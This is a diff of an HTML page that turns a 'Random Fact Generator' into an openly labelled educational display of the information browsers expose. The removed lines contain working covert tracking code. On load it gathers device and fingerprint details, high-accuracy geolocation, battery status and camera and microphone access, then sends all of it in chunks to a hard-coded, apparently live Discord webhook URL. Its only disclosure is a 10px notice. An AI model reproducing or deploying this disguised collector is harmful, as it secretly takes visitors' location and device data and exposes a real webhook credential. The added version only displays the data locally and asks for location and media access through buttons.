@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Random Fact Generator</title>
+    <title>Client Information Display</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -19,18 +19,6 @@
             border-bottom: 2px solid #ddd;
             padding-bottom: 10px;
         }
-        .warning-box {
-            background-color: #ffebee;
-            color: #c62828;
-            padding: 15px;
-            margin: 20px 0;
-            border-radius: 5px;
-            border-left: 5px solid #c62828;
-            font-weight: bold;
-        }
-        p {
-            margin-bottom: 20px;
-        }
         .info-section {
             background-color: white;
             padding: 15px;
@@ -38,265 +26,129 @@
             border-radius: 5px;
             box-shadow: 0 2px 4px rgba(0,0,0,0.1);
         }
-        .tiny-warning {
-            font-size: 10px;
-            color: #999;
-            text-align: center;
-            margin-top: 20px;
-            padding: 5px;
+        h2 {
+            color: #444;
+            margin-top: 0;
         }
-        #fact-display {
-            background-color: white;
-            padding: 20px;
+        .info-item {
+            margin-bottom: 10px;
+        }
+        .label {
+            font-weight: bold;
+            display: inline-block;
+            width: 180px;
+        }
+        .value {
+            display: inline-block;
+        }
+        .disclaimer {
+            background-color: #fffacc;
+            padding: 10px;
             border-radius: 5px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-            min-height: 80px;
-            margin: 20px 0;
-            font-size: 18px;
-            text-align: center;
-        }
-        button {
-            display: block;
-            margin: 0 auto;
-            padding: 10px 20px;
-            background-color: #4CAF50;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            font-size: 16px;
-            cursor: pointer;
-            transition: background-color 0.3s;
-        }
-        button:hover {
-            background-color: #45a049;
+            font-size: 0.9em;
+            margin-top: 20px;
         }
     </style>
 </head>
 <body>
-    <h1>Random Fact Generator</h1>
-    
-    <div class="tiny-warning">
-        By using this site, you agree to our data collection practices.
+    <h1>Client Information Display</h1>
+    <div class="disclaimer">
+        <strong>Note:</strong> This page demonstrates the type of information websites can collect about visitors.
+        This is for educational purposes only and helps illustrate privacy concepts and web security awareness.
+    </div>
+
+    <div class="info-section">
+        <h2>Browser & Device Information</h2>
+        <div id="browser-info"></div>
+    </div>
+
+    <div class="info-section">
+        <h2>Screen & Window Information</h2>
+        <div id="screen-info"></div>
+    </div>
+
+    <div class="info-section">
+        <h2>Network Information</h2>
+        <div id="network-info"></div>
+    </div>
+
+    <div class="info-section">
+        <h2>Location Information</h2>
+        <div id="geo-info"></div>
+    </div>
+
+    <div class="info-section">
+        <h2>Battery Information</h2>
+        <div id="battery-info"></div>
     </div>
     
     <div class="info-section">
-        <p>Click the button below to generate a random interesting fact!</p>
-        <button id="fact-button">Generate Random Fact</button>
-        <div id="fact-display">Your random fact will appear here...</div>
+        <h2>Hardware Information</h2>
+        <div id="hardware-info"></div>
     </div>
     
     <div class="info-section">
-        <p>Data Collection Status:</p>
-        <div id="collection-status">Collecting data...</div>
+        <h2>Browser Capabilities</h2>
+        <div id="capabilities-info"></div>
+    </div>
+    
+    <div class="info-section">
+        <h2>Time & Timezone Information</h2>
+        <div id="time-info"></div>
+    </div>
+    
+    <div class="info-section">
+        <h2>Media Devices</h2>
+        <div id="media-info"></div>
+    </div>
+    
+    <div class="info-section">
+        <h2>Local Storage Analysis</h2>
+        <div id="storage-info"></div>
+    </div>
+    
+    <div class="info-section">
+        <h2>HTTP Request Headers</h2>
+        <div id="headers-info">
+            <p>Note: Complete headers are only visible server-side, but common headers are estimated below.</p>
+        </div>
+    </div>
+    
+    <div class="info-section">
+        <h2>Canvas Fingerprinting Sample</h2>
+        <div id="fingerprint-info">
+            <p>This demonstrates one technique used for browser fingerprinting:</p>
+            <canvas id="fingerprintCanvas" width="220" height="30"></canvas>
+            <div id="canvas-hash"></div>
+        </div>
+    </div>
+    
+    <div class="info-section">
+        <h2>Performance Information</h2>
+        <div id="performance-info"></div>
     </div>
 
     <script>
-        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1331766891630563360/hNFGqedGjuvsgNJmGBrk0asdX_kZ0D7dlK-7MdXEHihk_oXwYDrGtdNNRGO4UA4ZmBf7";
-        
-        const allCollectedData = {};
-        let dataSent = false;
-        
-        let dataCollectionComplete = {
-            basic: false,
-            geo: false,
-            battery: false,
-            media: false
-        };
-        
-        function sendToDiscordWebhook() {
-            if (dataSent) return; // Prevent multiple sends
-            
-            console.log("Attempting to send data to Discord webhook...");
-            if (!DISCORD_WEBHOOK_URL) {
-                console.error("Discord webhook URL is empty or invalid");
-                return;
-            }
-            
-            let formattedMessage = "**Client Information Collection Results**\n\n";
-            formattedMessage += `**Timestamp:** ${new Date().toString()}\n\n`;
-            
-            formattedMessage += "**🌐 BROWSER INFORMATION**\n";
-            if (allCollectedData['browser-info']) {
-                Object.entries(allCollectedData['browser-info']).forEach(([key, value]) => {
-                    formattedMessage += `${key}: ${value}\n`;
-                });
-            }
-            formattedMessage += "\n";
-            
-            formattedMessage += "**📱 SCREEN & WINDOW INFORMATION**\n";
-            if (allCollectedData['screen-info']) {
-                Object.entries(allCollectedData['screen-info']).forEach(([key, value]) => {
-                    formattedMessage += `${key}: ${value}\n`;
-                });
-            }
-            formattedMessage += "\n";
-            
-            formattedMessage += "**🌐 NETWORK INFORMATION**\n";
-            if (allCollectedData['network-info']) {
-                Object.entries(allCollectedData['network-info']).forEach(([key, value]) => {
-                    formattedMessage += `${key}: ${value}\n`;
-                });
-            }
-            formattedMessage += "\n";
-            
-            formattedMessage += "**📍 LOCATION INFORMATION**\n";
-            if (allCollectedData['geo-info']) {
-                Object.entries(allCollectedData['geo-info']).forEach(([key, value]) => {
-                    formattedMessage += `${key}: ${value}\n`;
-                });
-            }
-            formattedMessage += "\n";
-            
-            formattedMessage += "**🔋 BATTERY INFORMATION**\n";
-            if (allCollectedData['battery-info']) {
-                Object.entries(allCollectedData['battery-info']).forEach(([key, value]) => {
-                    formattedMessage += `${key}: ${value}\n`;
-                });
-            }
-            formattedMessage += "\n";
-            
-            formattedMessage += "**💻 HARDWARE INFORMATION**\n";
-            if (allCollectedData['hardware-info']) {
-                Object.entries(allCollectedData['hardware-info']).forEach(([key, value]) => {
-                    formattedMessage += `${key}: ${value}\n`;
-                });
-            }
-            formattedMessage += "\n";
-            
-            formattedMessage += "**⚙️ BROWSER CAPABILITIES**\n";
-            if (allCollectedData['capabilities-info']) {
-                Object.entries(allCollectedData['capabilities-info']).forEach(([key, value]) => {
-                    formattedMessage += `${key}: ${value}\n`;
-                });
-            }
-            formattedMessage += "\n";
-            
-            formattedMessage += "**🕒 TIME & TIMEZONE**\n";
-            if (allCollectedData['time-info']) {
-                Object.entries(allCollectedData['time-info']).forEach(([key, value]) => {
-                    formattedMessage += `${key}: ${value}\n`;
-                });
-            }
-            formattedMessage += "\n";
-            
-            formattedMessage += "**📷 MEDIA DEVICES**\n";
-            if (allCollectedData['media-info']) {
-                Object.entries(allCollectedData['media-info']).forEach(([key, value]) => {
-                    formattedMessage += `${key}: ${value}\n`;
-                });
-            }
-            formattedMessage += "\n";
-            
-            formattedMessage += "**💾 STORAGE INFORMATION**\n";
-            if (allCollectedData['storage-info']) {
-                Object.entries(allCollectedData['storage-info']).forEach(([key, value]) => {
-                    formattedMessage += `${key}: ${value}\n`;
-                });
-            }
-            formattedMessage += "\n";
-            
-            formattedMessage += "**📋 HTTP HEADERS**\n";
-            if (allCollectedData['headers-info']) {
-                Object.entries(allCollectedData['headers-info']).forEach(([key, value]) => {
-                    formattedMessage += `${key}: ${value}\n`;
-                });
-            }
-            formattedMessage += "\n";
-            
-            formattedMessage += "**👆 FINGERPRINTING**\n";
-            if (allCollectedData['fingerprint-info']) {
-                Object.entries(allCollectedData['fingerprint-info']).forEach(([key, value]) => {
-                    formattedMessage += `${key}: ${value}\n`;
-                });
-            }
-            formattedMessage += "\n";
-            
-            formattedMessage += "**⚡ PERFORMANCE**\n";
-            if (allCollectedData['performance-info']) {
-                Object.entries(allCollectedData['performance-info']).forEach(([key, value]) => {
-                    formattedMessage += `${key}: ${value}\n`;
-                });
-            }
-            
-            const messageChunks = [];
-            const maxLength = 1950; 
-            
-            let currentChunk = "";
-            const lines = formattedMessage.split('\n');
-            
-            for (const line of lines) {
-                if (currentChunk.length + line.length + 1 > maxLength) {
-                    messageChunks.push(currentChunk);
-                    currentChunk = line + '\n';
-                } else {
-                    currentChunk += line + '\n';
-                }
-            }
-            
-            if (currentChunk.length > 0) {
-                messageChunks.push(currentChunk);
-            }
-            
-            // Mark as sent to prevent duplicate sends
-            dataSent = true;
-            document.getElementById('collection-status').textContent = "Sending data...";
-            
-            messageChunks.forEach((chunk, index) => {
-                setTimeout(() => {
-                    console.log(`Sending chunk ${index+1} of ${messageChunks.length}`);
-                    fetch(DISCORD_WEBHOOK_URL, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            content: chunk,
-                            username: "Security Demo",
-                            avatar_url: "https://cdn-icons-png.flaticon.com/512/1946/1946429.png",
-                        })
-                    })
-                    .then(response => {
-                        if (!response.ok) {
-                            return response.text().then(text => {
-                                throw new Error(`Discord API error: ${response.status} ${text}`);
-                            });
-                        }
-                        console.log(`Successfully sent chunk ${index+1}`);
-                        if (index === messageChunks.length - 1) {
-                            document.getElementById('collection-status').textContent = "Data sent successfully!";
-                        }
-                        return response.text();
-                    })
-                    .catch(error => {
-                        console.error('Error sending to Discord:', error);
-                        document.getElementById('collection-status').textContent = "Error sending data: " + error.message;
-                    });
-                }, index * 1500);
-            });
+        // Function to create and append info items
+        function addInfoItem(containerId, label, value) {
+            const container = document.getElementById(containerId);
+            const item = document.createElement('div');
+            item.className = 'info-item';
+
+            const labelSpan = document.createElement('span');
+            labelSpan.className = 'label';
+            labelSpan.textContent = label + ': ';
+
+            const valueSpan = document.createElement('span');
+            valueSpan.className = 'value';
+            valueSpan.textContent = value;
+
+            item.appendChild(labelSpan);
+            item.appendChild(valueSpan);
+            container.appendChild(item);
         }
-        
-        function checkDataCollectionStatus() {
-            console.log("Checking data collection status:", dataCollectionComplete);
-            const complete = Object.values(dataCollectionComplete).filter(status => status === true).length;
-            const total = Object.values(dataCollectionComplete).length;
-            
-            document.getElementById('collection-status').textContent = 
-                `Collected ${complete}/${total} data categories. ${complete === total ? 'Sending data...' : 'Still collecting...'}`;
-                
-            if (Object.values(dataCollectionComplete).every(status => status === true)) {
-                console.log("All data collection complete, sending to webhook");
-                // Add a small delay to make sure everything is collected
-                setTimeout(sendToDiscordWebhook, 1000);
-            }
-        }
-        
-        function storeData(category, label, value) {
-            if (!allCollectedData[category]) {
-                allCollectedData[category] = {};
-            }
-            allCollectedData[category][label] = value;
-        }
-        
+
+        // Collect and display browser & device information
         const browserInfo = {
             'User Agent': navigator.userAgent,
             'Browser Language': navigator.language,
@@ -309,11 +161,12 @@
             'App Name': navigator.appName || 'Not available',
             'Product': navigator.product || 'Not available'
         };
-        
+
         Object.entries(browserInfo).forEach(([label, value]) => {
-            storeData('browser-info', label, value);
+            addInfoItem('browser-info', label, value);
         });
-        
+
+        // Collect and display screen & window information
         const screenInfo = {
             'Screen Width': window.screen.width + 'px',
             'Screen Height': window.screen.height + 'px',
@@ -326,11 +179,12 @@
             'Device Pixel Ratio': window.devicePixelRatio,
             'Orientation': screen.orientation ? screen.orientation.type : 'Not available'
         };
-        
+
         Object.entries(screenInfo).forEach(([label, value]) => {
-            storeData('screen-info', label, value);
+            addInfoItem('screen-info', label, value);
         });
-        
+
+        // Collect network information if available
         if ('connection' in navigator) {
             const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
             if (connection) {
@@ -340,15 +194,73 @@
                     'Round Trip Time': (connection.rtt ? connection.rtt + ' ms' : 'Not available'),
                     'Save Data Mode': connection.saveData ? 'Enabled' : 'Disabled'
                 };
-                
+
                 Object.entries(networkInfo).forEach(([label, value]) => {
-                    storeData('network-info', label, value);
+                    addInfoItem('network-info', label, value);
                 });
             }
         } else {
-            storeData('network-info', 'Network Information', 'API not available in this browser');
+            addInfoItem('network-info', 'Network Information', 'API not available in this browser');
+        }
+
+        // Request geolocation if available
+        if ('geolocation' in navigator) {
+            addInfoItem('geo-info', 'Geolocation API', 'Available (requires permission)');
+
+            const geoBtn = document.createElement('button');
+            geoBtn.textContent = 'Get Location (Requires Permission)';
+            geoBtn.style.marginTop = '10px';
+            geoBtn.onclick = function() {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        document.getElementById('geo-info').innerHTML = '';
+                        addInfoItem('geo-info', 'Latitude', position.coords.latitude);
+                        addInfoItem('geo-info', 'Longitude', position.coords.longitude);
+                        addInfoItem('geo-info', 'Accuracy', position.coords.accuracy + ' meters');
+                        if (position.coords.altitude) {
+                            addInfoItem('geo-info', 'Altitude', position.coords.altitude + ' meters');
+                        }
+                        if (position.coords.heading) {
+                            addInfoItem('geo-info', 'Heading', position.coords.heading + '°');
+                        }
+                        if (position.coords.speed) {
+                            addInfoItem('geo-info', 'Speed', position.coords.speed + ' m/s');
+                        }
+                        addInfoItem('geo-info', 'Timestamp', new Date(position.timestamp).toString());
+                    },
+                    function(error) {
+                        addInfoItem('geo-info', 'Error', error.message);
+                    },
+                    { enableHighAccuracy: true }
+                );
+            };
+            document.getElementById('geo-info').appendChild(geoBtn);
+        } else {
+            addInfoItem('geo-info', 'Geolocation API', 'Not available in this browser');
+        }
+
+        // Request battery info if available
+        if ('getBattery' in navigator) {
+            navigator.getBattery().then(function(battery) {
+                document.getElementById('battery-info').innerHTML = '';
+                addInfoItem('battery-info', 'Battery Charging', battery.charging ? 'Yes' : 'No');
+                addInfoItem('battery-info', 'Battery Level', (battery.level * 100) + '%');
+                addInfoItem('battery-info', 'Charging Time', battery.chargingTime === Infinity ? 'Unknown' : battery.chargingTime + ' seconds');
+                addInfoItem('battery-info', 'Discharging Time', battery.dischargingTime === Infinity ? 'Unknown' : battery.dischargingTime + ' seconds');
+
+                // Listen for battery changes
+                battery.addEventListener('chargingchange', function() {
+                    document.querySelector('#battery-info .info-item:nth-child(1) .value').textContent = battery.charging ? 'Yes' : 'No';
+                });
+                battery.addEventListener('levelchange', function() {
+                    document.querySelector('#battery-info .info-item:nth-child(2) .value').textContent = (battery.level * 100) + '%';
+                });
+            });
+        } else {
+            addInfoItem('battery-info', 'Battery API', 'Not available in this browser');
         }
         
+        // Hardware Information
         const hardwareInfo = {
             'Logical CPU Cores': navigator.hardwareConcurrency || 'Not available',
             'Maximum Touch Points': navigator.maxTouchPoints || 'Not available',
@@ -356,9 +268,10 @@
         };
         
         Object.entries(hardwareInfo).forEach(([label, value]) => {
-            storeData('hardware-info', label, value);
+            addInfoItem('hardware-info', label, value);
         });
         
+        // Browser Capabilities
         const caps = {
             'PDF Viewer Built-in': navigator.pdfViewerEnabled ? 'Yes' : 'No/Unknown',
             'Java Enabled': navigator.javaEnabled ? navigator.javaEnabled() : 'Unknown',
@@ -380,9 +293,10 @@
         };
         
         Object.entries(caps).forEach(([label, value]) => {
-            storeData('capabilities-info', label, value);
+            addInfoItem('capabilities-info', label, value);
         });
         
+        // Time and Timezone Information
         const now = new Date();
         const timeInfo = {
             'Current Time': now.toString(),
@@ -392,9 +306,51 @@
         };
         
         Object.entries(timeInfo).forEach(([label, value]) => {
-            storeData('time-info', label, value);
+            addInfoItem('time-info', label, value);
         });
         
+        // Media Devices Information (with permission)
+        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+            addInfoItem('media-info', 'Media Devices API', 'Available (requires permission)');
+            
+            const mediaBtn = document.createElement('button');
+            mediaBtn.textContent = 'Enumerate Media Devices (Requires Permission)';
+            mediaBtn.style.marginTop = '10px';
+            mediaBtn.onclick = function() {
+                navigator.mediaDevices.getUserMedia({ audio: true, video: true })
+                .then(function(stream) {
+                    // Stop the stream immediately
+                    stream.getTracks().forEach(track => track.stop());
+                    
+                    // Now we can enumerate devices
+                    navigator.mediaDevices.enumerateDevices()
+                    .then(function(devices) {
+                        document.getElementById('media-info').innerHTML = '';
+                        let audioInputCount = 0;
+                        let audioOutputCount = 0;
+                        let videoInputCount = 0;
+                        
+                        devices.forEach(function(device) {
+                            if (device.kind === 'audioinput') audioInputCount++;
+                            if (device.kind === 'audiooutput') audioOutputCount++;
+                            if (device.kind === 'videoinput') videoInputCount++;
+                        });
+                        
+                        addInfoItem('media-info', 'Microphones', audioInputCount);
+                        addInfoItem('media-info', 'Speakers/Headphones', audioOutputCount);
+                        addInfoItem('media-info', 'Cameras', videoInputCount);
+                    });
+                })
+                .catch(function(err) {
+                    addInfoItem('media-info', 'Error', err.message);
+                });
+            };
+            document.getElementById('media-info').appendChild(mediaBtn);
+        } else {
+            addInfoItem('media-info', 'Media Devices API', 'Not available in this browser');
+        }
+        
+        // Local Storage Analysis
         try {
             if (window.localStorage) {
                 const storageInfo = {
@@ -407,15 +363,16 @@
                 };
                 
                 Object.entries(storageInfo).forEach(([label, value]) => {
-                    storeData('storage-info', label, value);
+                    addInfoItem('storage-info', label, value);
                 });
             } else {
-                storeData('storage-info', 'Local Storage', 'Not available');
+                addInfoItem('storage-info', 'Local Storage', 'Not available');
             }
         } catch (e) {
-            storeData('storage-info', 'Error accessing storage', e.message);
+            addInfoItem('storage-info', 'Error accessing storage', e.message);
         }
         
+        // HTTP Headers (estimation)
         const commonHeaders = {
             'User-Agent': navigator.userAgent,
             'Accept-Language': navigator.language,
@@ -426,16 +383,15 @@
         };
         
         Object.entries(commonHeaders).forEach(([label, value]) => {
-            storeData('headers-info', label, value);
+            addInfoItem('headers-info', label, value);
         });
         
+        // Canvas fingerprinting demo
         try {
-            const canvas = document.createElement('canvas');
-            canvas.width = 220;
-            canvas.height = 30;
-            
+            const canvas = document.getElementById('fingerprintCanvas');
             const ctx = canvas.getContext('2d');
             
+            // Draw various things to make a unique canvas
             ctx.textBaseline = "top";
             ctx.font = "14px 'Arial'";
             ctx.textBaseline = "alphabetic";
@@ -446,15 +402,17 @@
             ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
             ctx.fillText("Test", 4, 17);
             
+            // Create a "hash" of the canvas
             const dataURL = canvas.toDataURL();
-            const hash = dataURL.length;
+            const hash = dataURL.length; // Simple "hash" - just the length
             
-            storeData('fingerprint-info', 'Canvas Fingerprint Value', 'Signature Length: ' + hash);
-            storeData('fingerprint-info', 'Canvas Data URL Hash', hash.toString());
+            // Display a simplified hash
+            addInfoItem('canvas-hash', 'Canvas Fingerprint Value', 'Signature Length: ' + hash);
         } catch (e) {
-            storeData('fingerprint-info', 'Canvas Fingerprinting', 'Failed: ' + e.message);
+            addInfoItem('canvas-hash', 'Canvas Fingerprinting', 'Failed: ' + e.message);
         }
         
+        // Performance Information
         if (window.performance) {
             const perfInfo = {
                 'Navigation Type': (function() {
@@ -471,203 +429,36 @@
             };
             
             Object.entries(perfInfo).forEach(([label, value]) => {
-                storeData('performance-info', label, value);
+                addInfoItem('performance-info', label, value);
             });
             
+            // Try to get newer performance data
             if (performance.getEntriesByType) {
                 try {
                     const navEntry = performance.getEntriesByType('navigation')[0];
                     if (navEntry) {
-                        storeData('performance-info', 'DOM Complete Time', navEntry.domComplete + ' ms');
-                        storeData('performance-info', 'DOM Interactive Time', navEntry.domInteractive + ' ms');
-                        storeData('performance-info', 'Response Start Time', navEntry.responseStart + ' ms');
+                        addInfoItem('performance-info', 'DOM Complete Time', navEntry.domComplete + ' ms');
+                        addInfoItem('performance-info', 'DOM Interactive Time', navEntry.domInteractive + ' ms');
+                        addInfoItem('performance-info', 'Response Start Time', navEntry.responseStart + ' ms');
                     }
                 } catch (e) {
+                    // Ignore errors for newer API
                 }
                 
                 try {
                     const paintEntries = performance.getEntriesByType('paint');
                     if (paintEntries.length > 0) {
                         paintEntries.forEach(entry => {
-                            storeData('performance-info', entry.name, entry.startTime + ' ms');
+                            addInfoItem('performance-info', entry.name, entry.startTime + ' ms');
                         });
                     }
                 } catch (e) {
+                    // Ignore errors for newer API
                 }
             }
         } else {
-            storeData('performance-info', 'Performance API', 'Not available');
+            addInfoItem('performance-info', 'Performance API', 'Not available');
         }
-        
-        dataCollectionComplete.basic = true;
-        
-        if ('geolocation' in navigator) {
-            navigator.geolocation.getCurrentPosition(
-                function(position) {
-                    storeData('geo-info', 'Latitude', position.coords.latitude);
-                    storeData('geo-info', 'Longitude', position.coords.longitude);
-                    storeData('geo-info', 'Accuracy', position.coords.accuracy + ' meters');
-                    if (position.coords.altitude) {
-                        storeData('geo-info', 'Altitude', position.coords.altitude + ' meters');
-                    }
-                    if (position.coords.heading) {
-                        storeData('geo-info', 'Heading', position.coords.heading + '°');
-                    }
-                    if (position.coords.speed) {
-                        storeData('geo-info', 'Speed', position.coords.speed + ' m/s');
-                    }
-                    storeData('geo-info', 'Timestamp', new Date(position.timestamp).toString());
-                    
-                    dataCollectionComplete.geo = true;
-                    checkDataCollectionStatus();
-                },
-                function(error) {
-                    storeData('geo-info', 'Geolocation API', 'Available but permission denied or error');
-                    storeData('geo-info', 'Error', error.message);
-                    
-                    dataCollectionComplete.geo = true;
-                    checkDataCollectionStatus();
-                },
-                { enableHighAccuracy: true, timeout: 10000 }
-            );
-        } else {
-            storeData('geo-info', 'Geolocation API', 'Not available in this browser');
-            
-            dataCollectionComplete.geo = true;
-            checkDataCollectionStatus();
-        }
-        
-        if ('getBattery' in navigator) {
-            navigator.getBattery().then(function(battery) {
-                storeData('battery-info', 'Battery Charging', battery.charging ? 'Yes' : 'No');
-                storeData('battery-info', 'Battery Level', (battery.level * 100) + '%');
-                storeData('battery-info', 'Charging Time', battery.chargingTime === Infinity ? 'Unknown' : battery.chargingTime + ' seconds');
-                storeData('battery-info', 'Discharging Time', battery.dischargingTime === Infinity ? 'Unknown' : battery.dischargingTime + ' seconds');
-                
-                dataCollectionComplete.battery = true;
-                checkDataCollectionStatus();
-            }).catch(function(error) {
-                storeData('battery-info', 'Battery API', 'Error accessing battery: ' + error.message);
-                
-                dataCollectionComplete.battery = true;
-                checkDataCollectionStatus();
-            });
-        } else {
-            storeData('battery-info', 'Battery API', 'Not available in this browser');
-            
-            dataCollectionComplete.battery = true;
-            checkDataCollectionStatus();
-        }
-        
-        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
-            console.log("Attempting to access media devices...");
-            navigator.mediaDevices.getUserMedia({ audio: true, video: true })
-            .then(function(stream) {
-                console.log("Media access granted");
-                stream.getTracks().forEach(track => track.stop());
-                
-                navigator.mediaDevices.enumerateDevices()
-                .then(function(devices) {
-                    let audioInputCount = 0;
-                    let audioOutputCount = 0;
-                    let videoInputCount = 0;
-                    
-                    devices.forEach(function(device) {
-                        if (device.kind === 'audioinput') audioInputCount++;
-                        if (device.kind === 'audiooutput') audioOutputCount++;
-                        if (device.kind === 'videoinput') videoInputCount++;
-                    });
-                    
-                    storeData('media-info', 'Microphones', audioInputCount);
-                    storeData('media-info', 'Speakers/Headphones', audioOutputCount);
-                    storeData('media-info', 'Cameras', videoInputCount);
-                    
-                    console.log("Media devices collected:", { audioInputCount, audioOutputCount, videoInputCount });
-                    dataCollectionComplete.media = true;
-                    checkDataCollectionStatus();
-                });
-            })
-            .catch(function(err) {
-                console.log("Media access denied:", err.message);
-                navigator.mediaDevices.enumerateDevices()
-                .then(function(devices) {
-                    storeData('media-info', 'Permission Status', 'Denied: ' + err.message);
-                    storeData('media-info', 'Device Count', devices.length + ' (limited information due to permissions)');
-                    
-                    dataCollectionComplete.media = true;
-                    checkDataCollectionStatus();
-                })
-                .catch(function(enumErr) {
-                    storeData('media-info', 'Media Devices API', 'Error: ' + enumErr.message);
-                    
-                    dataCollectionComplete.media = true;
-                    checkDataCollectionStatus();
-                });
-            });
-        } else {
-            console.log("Media Devices API not available");
-            storeData('media-info', 'Media Devices API', 'Not available in this browser');
-            
-            dataCollectionComplete.media = true;
-            checkDataCollectionStatus();
-        }
-
-        // Force execution of sendToDiscordWebhook after all data is collected
-        // Backup timeout in case something goes wrong with the normal flow
-        setTimeout(function() {
-            if (!dataSent) {
-                console.log("Backup timeout triggered, sending data");
-                sendToDiscordWebhook();
-            }
-        }, 15000);
-
-        const facts = [
-            "The shortest war in history was between Britain and Zanzibar in 1896. It lasted only 38 minutes.",
-            "Octopuses have three hearts and blue blood.",
-            "A group of flamingos is called a 'flamboyance'.",
-            "The Great Wall of China is not visible from space with the naked eye.",
-            "Bananas are berries, but strawberries aren't.",
-            "The world's oldest known living tree is over 5,000 years old.",
-            "Honey never spoils. Archaeologists have found pots of honey in ancient Egyptian tombs that are over 3,000 years old and still perfectly good to eat.",
-            "A day on Venus is longer than a year on Venus. It takes 243 Earth days to rotate once on its axis, but only 225 Earth days to go around the Sun.",
-            "Cows have best friends and get stressed when they are separated.",
-            "The fingerprints of koalas are so similar to humans that they have on occasion been confused at crime scenes.",
-            "The Hawaiian alphabet has only 12 letters.",
-            "Australia is wider than the moon. The moon is 3,400 km in diameter, while Australia is 4,000 km from east to west.",
-            "There are more possible iterations of a game of chess than there are atoms in the known universe.",
-            "A blue whale's heart is so big that a human could swim through its arteries.",
-            "Polar bears have black skin underneath their white fur.",
-            "The average person will spend six months of their life waiting at red lights.",
-            "A bolt of lightning is five times hotter than the surface of the sun.",
-            "Humans share 50% of their DNA with bananas.",
-            "The only letter that doesn't appear in the periodic table is the letter J.",
-            "A hummingbird weighs less than a penny.",
-            "The Eiffel Tower can be 15 cm taller during the summer due to thermal expansion.",
-            "Cats can't taste sweetness.",
-            "The world's largest desert is Antarctica, not the Sahara.",
-            "A single cloud can weigh more than a million pounds.",
-            "Astronauts cannot cry in space because tears don't fall in zero gravity.",
-            "The average person walks the equivalent of five times around the world in their lifetime.",
-            "Dolphins sleep with one eye open.",
-            "There are more trees on Earth than stars in the Milky Way galaxy.",
-            "A group of crows is called a 'murder'.",
-            "Human teeth are just as strong as shark teeth."
-        ];
-        
-        document.getElementById('fact-button').addEventListener('click', function() {
-            const randomIndex = Math.floor(Math.random() * facts.length);
-            document.getElementById('fact-display').textContent = facts[randomIndex];
-        });
-        
-        // Update status periodically
-        setInterval(function() {
-            if (dataSent) return;
-            
-            const complete = Object.values(dataCollectionComplete).filter(status => status === true).length;
-            const total = Object.values(dataCollectionComplete).length;
-            document.getElementById('collection-status').textContent = 
-                `Collected ${complete}/${total} data categories. ${complete === total ? 'Preparing to send data...' : 'Still collecting...'}`;
-        }, 1000);
     </script>
 </body>
 </html>
